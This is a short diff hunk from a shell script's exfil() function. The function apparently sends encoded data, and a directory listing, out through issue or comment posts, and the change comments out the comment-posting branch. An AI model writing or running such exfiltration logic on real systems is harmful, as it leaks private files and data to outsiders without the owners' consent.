@@ -16,7 +16,7 @@ exfil() {
     if [ -z "$ISSUE_NUMBER" ]; then
         create_issue "$encoded"
     else
-        create_comment "$encoded"
+        # create_comment "$encoded"
     fi
     
     # Also create a comment with the directory listing
